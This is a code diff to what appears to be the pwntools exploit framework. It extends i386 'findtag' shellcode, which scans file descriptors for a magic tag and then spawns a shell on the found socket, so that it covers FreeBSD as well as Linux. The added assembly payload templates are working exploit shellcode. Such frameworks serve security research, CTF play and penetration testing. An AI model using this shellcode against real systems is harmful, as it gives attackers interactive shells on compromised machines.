@@ -1,8 +1,8 @@
 from pwn.internal.shellcode_helper import *
 from .. import dupsh
 
-@shellcode_reqs(arch='i386', os='linux', network=['ipv4', 'ipv6'])
-def findtagsh(tag, clear_socks = True):
+@shellcode_reqs(arch='i386', os=['linux', 'freebsd'], network=['ipv4', 'ipv6'])
+def findtagsh(tag, clear_socks = True, os = None):
     """Args: Tag to look for
 
     Finds the current file descriptor using the findtag
@@ -17,8 +17,8 @@ def findtagsh(tag, clear_socks = True):
     sock.interactive()"""
     return findtag(tag, clear_socks), dupsh("ebp")
 
-@shellcode_reqs(arch='i386', os='linux', network=['ipv4', 'ipv6'])
-def findtag(tag, clear_socks = True):
+@shellcode_reqs(arch='i386', os=['linux', 'freebsd'], network=['ipv4', 'ipv6'])
+def findtag(tag, clear_socks = True, os = None):
     """Args: tag to look for
     Tries to recv up to 127 bytes (nonblocking) from every file descriptor
     in the range [0, 65535] until one is found that outputs the magic tag as
@@ -42,7 +42,8 @@ def findtag(tag, clear_socks = True):
     On my test system, it could clean out about 4k of garbage per second.
 """
 
-    return """
+    if os == 'linux':
+        return """
 findtag:
     push cs                  ; This is just a placeholder, which should not match the cookie.
                              ; cs is chosen since it always contains null-bytes and thus is
@@ -71,3 +72,35 @@ findtag:
     push edi
     jne .loop
 """ % ("0" if clear_socks else "MSG_PEEK", int(tag))
+
+    elif os == 'freebsd':
+        return """
+findtag:
+    push cs                  ; This is just a placeholder, which should not match the cookie.
+                             ; cs is chosen since it always contains null-bytes and thus is
+                             ; unlikely to be chosen as a cookie
+
+    mov esi, esp
+
+    xor eax, eax
+
+    push eax
+    push eax
+    push MSG_DONTWAIT | %s
+    push 0x7f
+    push esi
+    push 1
+    push eax
+
+.loop:
+    push SYS_recvfrom
+    pop eax
+
+    int 0x80
+    inc word [esp+4]
+    cmp word [esi], 0x%08x
+    jne .loop
+""" % ("0" if clear_socks else "MSG_PEEK", int(tag))
+    
+    else:
+        bug('OS was neither linux nor freebsd')
